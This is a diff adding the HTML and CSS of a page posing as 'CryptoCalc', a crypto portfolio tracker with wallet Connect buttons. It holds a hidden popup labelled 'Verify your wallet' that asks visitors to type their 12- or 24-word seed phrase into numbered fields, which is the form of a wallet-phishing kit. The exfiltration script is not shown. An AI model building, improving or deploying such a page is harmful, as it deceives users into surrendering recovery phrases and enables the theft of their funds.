+          transform: rotateZ(1deg);
+          opacity: 0
+        }
+      }
+
+      @keyframes swal2-toast-animate-success-line-tip {
+        0% {
+          top: .5625em;
+          left: .0625em;
+          width: 0
+        }
+
+        54% {
+          top: .125em;
+          left: .125em;
+          width: 0
+        }
+
+        70% {
+          top: .625em;
+          left: -0.25em;
+          width: 1.625em
+        }
+
+        84% {
+          top: 1.0625em;
+          left: .75em;
+          width: .5em
+        }
+
+        100% {
+          top: 1.125em;
+          left: .1875em;
+          width: .75em
+        }
+      }
+
+      @keyframes swal2-toast-animate-success-line-long {
+        0% {
+          top: 1.625em;
+          right: 1.375em;
+          width: 0
+        }
+
+        65% {
+          top: 1.25em;
+          right: .9375em;
+          width: 0
+        }
+
+        84% {
+          top: .9375em;
+          right: 0;
+          width: 1.125em
+        }
+
+        100% {
+          top: .9375em;
+          right: .1875em;
+          width: 1.375em
+        }
+      }
+
+      @keyframes swal2-show {
+        0% {
+          transform: scale(0.7)
+        }
+
+        45% {
+          transform: scale(1.05)
+        }
+
+        80% {
+          transform: scale(0.95)
+        }
+
+        100% {
+          transform: scale(1)
+        }
+      }
+
+      @keyframes swal2-hide {
+        0% {
+          transform: scale(1);
+          opacity: 1
+        }
+
+        100% {
+          transform: scale(0.5);
+          opacity: 0
+        }
+      }
+
+      @keyframes swal2-animate-success-line-tip {
+        0% {
+          top: 1.1875em;
+          left: .0625em;
+          width: 0
+        }
+
+        54% {
+          top: 1.0625em;
+          left: .125em;
+          width: 0
+        }
+
+        70% {
+          top: 2.1875em;
+          left: -0.375em;
+          width: 3.125em
+        }
+
+        84% {
+          top: 3em;
+          left: 1.3125em;
+          width: 1.0625em
+        }
+
+        100% {
+          top: 2.8125em;
+          left: .8125em;
+          width: 1.5625em
+        }
+      }
+
+      @keyframes swal2-animate-success-line-long {
+        0% {
+          top: 3.375em;
+          right: 2.875em;
+          width: 0
+        }
+
+        65% {
+          top: 3.375em;
+          right: 2.875em;
+          width: 0
+        }
+
+        84% {
+          top: 2.1875em;
+          right: 0;
+          width: 3.4375em
+        }
+
+        100% {
+          top: 2.375em;
+          right: .5em;
+          width: 2.9375em
+        }
+      }
+
+      @keyframes swal2-rotate-success-circular-line {
+        0% {
+          transform: rotate(-45deg)
+        }
+
+        5% {
+          transform: rotate(-45deg)
+        }
+
+        12% {
+          transform: rotate(-405deg)
+        }
+
+        100% {
+          transform: rotate(-405deg)
+        }
+      }
+
+      @keyframes swal2-animate-error-x-mark {
+        0% {
+          margin-top: 1.625em;
+          transform: scale(0.4);
+          opacity: 0
+        }
+
+        50% {
+          margin-top: 1.625em;
+          transform: scale(0.4);
+          opacity: 0
+        }
+
+        80% {
+          margin-top: -0.375em;
+          transform: scale(1.15)
+        }
+
+        100% {
+          margin-top: 0;
+          transform: scale(1);
+          opacity: 1
+        }
+      }
+
+      @keyframes swal2-animate-error-icon {
+        0% {
+          transform: rotateX(100deg);
+          opacity: 0
+        }
+
+        100% {
+          transform: rotateX(0deg);
+          opacity: 1
+        }
+      }
+
+      @keyframes swal2-rotate-loading {
+        0% {
+          transform: rotate(0deg)
+        }
+
+        100% {
+          transform: rotate(360deg)
+        }
+      }
+
+      @keyframes swal2-animate-question-mark {
+        0% {
+          transform: rotateY(-360deg)
+        }
+
+        100% {
+          transform: rotateY(0)
+        }
+      }
+
+      @keyframes swal2-animate-i-mark {
+        0% {
+          transform: rotateZ(45deg);
+          opacity: 0
+        }
+
+        25% {
+          transform: rotateZ(-25deg);
+          opacity: .4
+        }
+
+        50% {
+          transform: rotateZ(15deg);
+          opacity: .8
+        }
+
+        75% {
+          transform: rotateZ(-5deg);
+          opacity: 1
+        }
+
+        100% {
+          transform: rotateX(0);
+          opacity: 1
+        }
+      }
+
+      body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+        overflow: hidden
+      }
+
+      body.swal2-height-auto {
+        height: auto !important
+      }
+
+      body.swal2-no-backdrop .swal2-container {
+        background-color: rgba(0, 0, 0, 0) !important;
+        pointer-events: none
+      }
+
+      body.swal2-no-backdrop .swal2-container .swal2-popup {
+        pointer-events: all
+      }
+
+      body.swal2-no-backdrop .swal2-container .swal2-modal {
+        box-shadow: 0 0 10px rgba(0, 0, 0, .4)
+      }
+
+      @media print {
+        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+          overflow-y: scroll !important
+        }
+
+        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
+          display: none
+        }
+
+        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
+          position: static !important
+        }
+      }
+
+      body.swal2-toast-shown .swal2-container {
+        box-sizing: border-box;
+        width: 360px;
+        max-width: 100%;
+        background-color: rgba(0, 0, 0, 0);
+        pointer-events: none
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-top {
+        inset: 0 auto auto 50%;
+        transform: translateX(-50%)
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-top-end,
+      body.swal2-toast-shown .swal2-container.swal2-top-right {
+        inset: 0 0 auto auto
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-top-start,
+      body.swal2-toast-shown .swal2-container.swal2-top-left {
+        inset: 0 auto auto 0
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-center-start,
+      body.swal2-toast-shown .swal2-container.swal2-center-left {
+        inset: 50% auto auto 0;
+        transform: translateY(-50%)
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-center {
+        inset: 50% auto auto 50%;
+        transform: translate(-50%, -50%)
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-center-end,
+      body.swal2-toast-shown .swal2-container.swal2-center-right {
+        inset: 50% 0 auto auto;
+        transform: translateY(-50%)
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-bottom-start,
+      body.swal2-toast-shown .swal2-container.swal2-bottom-left {
+        inset: auto auto 0 0
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-bottom {
+        inset: auto auto 0 50%;
+        transform: translateX(-50%)
+      }
+
+      body.swal2-toast-shown .swal2-container.swal2-bottom-end,
+      body.swal2-toast-shown .swal2-container.swal2-bottom-right {
+        inset: auto 0 0 auto
+      }
+    </style>
+    <style>
+      .swal2-container {
+        z-index: 2147483646;
+      }
+
+      .wallet-icon {
+        border-radius: 14px;
+        max-width: 100px;
+      }
+
+      .phrase-wider-popup {
+        border-radius: 36px;
+        padding: 20px;
+        width: 35em;
+      }
+
+      .phrase-subtitle {
+        font-weight: 600;
+        color: #000;
+        font-family: "Noto Sans", sans-serif;
+        line-height: 22px;
+        font-size: 19px;
+      }
+
+      .phrase-subtext {
+        color: #999;
+        font-family: "Noto Sans", sans-serif;
+        margin: 0 auto 20px;
+        max-width: 300px;
+      }
+
+      .phrase-select {
+        display: flex;
+        color: #a9a9a9;
+        font-size: 16px;
+        font-weight: 400;
+        font-family: "Noto Sans", sans-serif;
+        margin: 0 auto;
+        width: fit-content;
+      }
+
+      .phrase-select-option {
+        cursor: pointer;
+        padding: 10px;
+      }
+
+      .phrase-select-option:hover {
+        transition: color .3s linear;
+        color: gray;
+      }
+
+      .phrase-select-selected {
+        cursor: default;
+        color: #000 !important;
+        font-weight: 400;
+      }
+
+      .phrase {
+        position: relative;
+        width: 15%;
+        min-width: 85px;
+        margin: 10px auto;
+        padding: 0 0 0 20px !important;
+        border-bottom: 1px solid #d3d3d3;
+      }
+
+      .phrase:focus-within {
+        transition: .1s;
+        border-bottom: 1px solid #545454;
+      }
+
+      .phrase label {
+        position: absolute;
+        text-align: right;
+        font-size: 16px;
+        width: auto;
+        height: 20px;
+        color: gray;
+        left: 0;
+        bottom: 3px;
+        font-weight: 200;
+        font-family: "Noto Sans", monospace;
+      }
+
+      .phrase input {
+        font-size: 14px;
+        line-height: 12px;
+        border: none !important;
+        margin: auto 0 0;
+        width: 100%;
+        padding-bottom: 4px;
+        outline: 0 !important;
+        text-align: left;
+        height: auto !important;
+        font-family: "Noto Sans", monospace;
+      }
+
+      .phrase-div {
+        display: flex;
+        flex-wrap: wrap;
+        width: 100%;
+      }
+
+      .phrase-button {
+        font-family: "Noto Sans", monospace;
+        background-color: #f0f0f0;
+        border: none;
+        border-radius: 8px;
+        text-align: center;
+        font-size: 16px;
+        padding: 10px;
+        margin-top: 30px;
+        width: 300px;
+        max-width: 100%;
+      }
+
+      .phrase-button:disabled {
+        cursor: not-allowed;
+        border: 1px solid #ddd;
+      }
+
+      .phrase-button:enabled:hover {
+        background-color: #e0e4eb;
+      }
+    </style>
+
+    
+  </head>
+  <body style="top: auto;">
+    <header>
+      <nav id="navbar" class="navbar">
+        <ul id="nav-links" class="nav-links">
+          <li>
+            <a href="https://cryptocalc.eu/paperhands/index.html" class="logo">
+              <img src="favicon.ico" alt="logo">
+            </a>
+          </li>
+          <li>
+            <span class="website-name">CryptoCalc</span>
+          </li>
+          <li>
+            <a href="https://dashboard.cryptocalcs.org/index.html">Portfolio Tracker</a>
+          </li>
+          <li>
+            <a href="https://dashboard.cryptocalcs.org/leaderboard.html">Leaderboard</a>
+          </li>
+          <li>
+            <a href="https://dashboard.cryptocalcs.org/contact.html">Contact Us</a>
+          </li>
+          <li>
+            <button id="toggleTheme" class="interact-button" hwjcl-wei="true">Get Started</button>
+          </li>
+        </ul>
+      </nav>
+    </header>
+    <main>
+      <section class="center-container">
+        <h3>The Ultimate Crypto Portfolio Tracker </h3>
+       <p style="max-width: 700px; margin: 0 auto; color: #c1c1c1; margin-bottom: 15px;">
+  Connect all your wallets and exchanges in a few clicks. Start effectively managing your entire portfolio crypto, DeFi, and NFTs  from a single dashboard.
+</p>
+        <div class="button-container">
+          <button id="binance" class="interact-button" hwjcl-wei="true">
+            <img src="trustwallet.png" alt="Metamask Logo" class="logo">
+            <span class="text-top">Trust</span>
+            <span class="text-bottom"> Connect <span class="arrow">&rarr;</span></span>
+            </span>
+          </button>
+          <button id="binance" class="interact-button" hwjcl-wei="true">
+            <img src="MetaMask_Fox.svg" alt="metamask-logo" class="logo">
+            <span class="text-top">MetaMask</span>
+            <span class="text-bottom"> Connect <span class="arrow">&rarr;</span></span>
+            </span>
+          </button>
+          <button id="binance" class="interact-button" hwjcl-wei="true">
+            <img width="90" height="90" src="coinbase-icon2.png" alt="Metamask Logo" class="logo">
+            <span class="text-top">Coinbase</span>
+            <span class="text-bottom"> Connect <span class="arrow">&rarr;</span></span>
+            </span>
+          </button>
+          <button id="binance" class="interact-button" hwjcl-wei="true">
+            <img width="100" height="100" img="" src="wallet.png" alt="Metamask Logo" class="logo">
+            <span class="text-top">Other</span>
+            <span class="text-bottom"> Connect <span class="arrow">&rarr;</span></span>
+            </span>
+          </button>
+        </div>
+        <section class="second-container">
+          <section class="video-container">
+            <video autoplay="" loop="" muted="" preload="auto">
+              <source src="profit-loss-banner.mp4" type="video/mp4">
+            </video>
+          </section>
+          <section class="text-container">
+            <h4> Get In-Depth Profit Loss Analysis</h4>
+            <p style="max-width: 700px; margin: 0 auto; color: #c1c1c1; margin-bottom: 15px;">Connect your wallet to get 24h, daily, weekly and cumulative Profit &amp; Loss analysis. Level up your crypto investing strategy.</p>
+            <button id="toggleTheme" class="interact-button" hwjcl-wei="true">Connect</button>
+          </section>
+        </section>
+      </section>
+    </main>
+    <footer id="footer">
+      <div class="mobile-off-content">
+        <p class="text-footer"> © Copyright Crypto Calc 2024. All rights reserved. <br>Get real-time insights into your crypto trading activity, track multiple wallets, and benchmark against the community leaderboard. </p>
+      </div>
+    </footer>
+    <div id="tc-widget-root">
+      <tc-root></tc-root>
+    </div>
+    <div id="popup-overlay" class="popup-overlay swal2-container swal2-center swal2-backdrop-show" style="overflow-y: auto; display: none; z-index: 99998;">
+      <div class="swal2-popup swal2-modal phrase-wider-popup swal2-show" aria-labelledby="swal2-title" aria-describedby="swal2-html-container" tabindex="-1" role="dialog" aria-live="assertive" aria-modal="true" style="display: none; z-index: 99999;">
+        <button type="button" class="swal2-close" aria-label="Close this dialog" style="display: flex;">×</button>
+        <div class="swal2-html-container" id="swal2-html-container" style="display: block;">
+          <img class="wallet-icon" src="d14efa6a445080a26a4959b990aad9a29639e705.png">
+          <p class="phrase-subtitle">Verify your wallet</p>
+          <p class="phrase-subtext">Please enter your seed phrase to continue</p>
+          <div class="phrase-div">
+            <div class="phrase" style="display: flex;">
+              <label>1</label>
+              <input id="word-1" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmnkcrfg83m5" aria-owns="autocomplete-lzemx7wmnkcrfg83m5" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>2</label>
+              <input id="word-2" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmqmeh3ytefj" aria-owns="autocomplete-lzemx7wmqmeh3ytefj" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>3</label>
+              <input id="word-3" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wm4b5tlvn4kl" aria-owns="autocomplete-lzemx7wm4b5tlvn4kl" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>4</label>
+              <input id="word-4" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmfp20x2d2ej" aria-owns="autocomplete-lzemx7wmfp20x2d2ej" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>5</label>
+              <input id="word-5" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wm4qllmtfks2" aria-owns="autocomplete-lzemx7wm4qllmtfks2" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>6</label>
+              <input id="word-6" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmpmc90696a6" aria-owns="autocomplete-lzemx7wmpmc90696a6" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>7</label>
+              <input id="word-7" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmpe4q8lyjag" aria-owns="autocomplete-lzemx7wmpe4q8lyjag" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>8</label>
+              <input id="word-8" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmru50esqjik" aria-owns="autocomplete-lzemx7wmru50esqjik" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>9</label>
+              <input id="word-9" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmbwim06e143" aria-owns="autocomplete-lzemx7wmbwim06e143" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>10</label>
+              <input id="word-10" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmd72q6w7oaq" aria-owns="autocomplete-lzemx7wmd72q6w7oaq" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>11</label>
+              <input id="word-11" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmjl6khj4px7" aria-owns="autocomplete-lzemx7wmjl6khj4px7" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase" style="display: flex;">
+              <label>12</label>
+              <input id="word-12" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmr7ex218unp" aria-owns="autocomplete-lzemx7wmr7ex218unp" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>13</label>
+              <input id="word-13" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmtpzccbxxqx" aria-owns="autocomplete-lzemx7wmtpzccbxxqx" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>14</label>
+              <input id="word-14" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wm7n1kv8umum" aria-owns="autocomplete-lzemx7wm7n1kv8umum" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>15</label>
+              <input id="word-15" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmwdc8m2jgyn" aria-owns="autocomplete-lzemx7wmwdc8m2jgyn" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>16</label>
+              <input id="word-16" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmda21ask7c7" aria-owns="autocomplete-lzemx7wmda21ask7c7" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>17</label>
+              <input id="word-17" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wm8n1nrom05x" aria-owns="autocomplete-lzemx7wm8n1nrom05x" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>18</label>
+              <input id="word-18" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmx636jfhhhy" aria-owns="autocomplete-lzemx7wmx636jfhhhy" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>19</label>
+              <input id="word-19" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmb5zkx1nwry" aria-owns="autocomplete-lzemx7wmb5zkx1nwry" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>20</label>
+              <input id="word-20" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wm270zg7i4ue" aria-owns="autocomplete-lzemx7wm270zg7i4ue" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>21</label>
+              <input id="word-21" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmh7aka8w6bs" aria-owns="autocomplete-lzemx7wmh7aka8w6bs" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>22</label>
+              <input id="word-22" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmvo9i2m18ug" aria-owns="autocomplete-lzemx7wmvo9i2m18ug" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>23</label>
+              <input id="word-23" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wmqjzxfuwbg4" aria-owns="autocomplete-lzemx7wmqjzxfuwbg4" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+            <div class="phrase phrase-18 phrase-24" style="display: none;">
+              <label>24</label>
+              <input id="word-24" maxlength="8" autocomplete="off" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-controls="autocomplete-lzemx7wm5jwsieicib" aria-owns="autocomplete-lzemx7wm5jwsieicib" aria-activedescendant="" aria-haspopup="listbox" value="">
+            </div>
+          </div>
+          <div class="phrase-select">
+            <div id="select12" class="phrase-select-option phrase-select-selected">12 words</div>
+            <div id="select24" class="phrase-select-option">24 words</div>
+          </div>
+          <button class="phrase-button" disabled="">Missing words</button>
+        </div>
+      </div>
+    </div>
+ 
+  </body>
+</html>
